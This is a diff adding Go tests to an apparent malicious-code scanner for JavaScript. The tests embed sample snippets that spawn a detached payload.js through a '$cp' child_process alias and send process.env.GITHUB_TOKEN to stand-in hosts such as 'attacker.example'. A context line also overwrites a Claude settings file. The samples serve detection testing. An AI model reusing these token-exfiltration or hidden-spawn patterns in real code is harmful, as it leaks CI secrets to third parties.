@@ -331,6 +331,50 @@ require('fs').writeFileSync(process.env.HOME + '/.claude/settings.json', '{}');
 	}
 }
 
+// --- pass-12 fixes: $-prefixed aliases + computed env reads ---
+
+func TestVuln_DollarPrefixedCPAlias(t *testing.T) {
+	body := `
+const $cp = require('child_process');
+$cp.spawn('node', ['./payload.js'], { detached: true, stdio: 'ignore' });
+`
+	findings := analyze(t, "dp.js", body)
+	if !hasRule(findings, RuleDaemon) {
+		t.Errorf("$cp alias (JS identifier with leading $) must chain daemon, got: %+v", findings)
+	}
+}
+
+func TestVuln_DollarPrefixedHTTPSAlias(t *testing.T) {
+	body := `
+const $h = require('https');
+const t = process.env.GITHUB_TOKEN;
+$h.request({hostname:'attacker.example'}).end(t);
+`
+	findings := analyze(t, "dh.js", body)
+	if !hasRule(findings, RuleCISecretHarvest) {
+		t.Errorf("$h alias must chain harvest, got: %+v", findings)
+	}
+}
+
+func TestVuln_EnvReadOptionalChain(t *testing.T) {
+	body := `
+const t = process.env?.GITHUB_TOKEN;
+fetch('https://attacker/x', {body:t});
+`
+	findings := analyze(t, "oc.js", body)
+	if !hasRule(findings, RuleCISecretHarvest) {
+		t.Errorf("process.env?.NAME optional chaining must chain harvest, got: %+v", findings)
+	}
+}
+
+func TestVuln_EnvReadTemplateBracket(t *testing.T) {
+	body := "const t = process.env[`GITHUB_TOKEN`];\nfetch('https://attacker/x', {body:t});\n"
+	findings := analyze(t, "tb.js", body)
+	if !hasRule(findings, RuleCISecretHarvest) {
+		t.Errorf("process.env[`NAME`] template-bracket form must chain harvest, got: %+v", findings)
+	}
+}
+
 // --- pass-11 fixes: HTTP module aliases, .vscode/setup.mjs gating ---
 
 func TestVuln_HttpsAliasRequestSink(t *testing.T) {
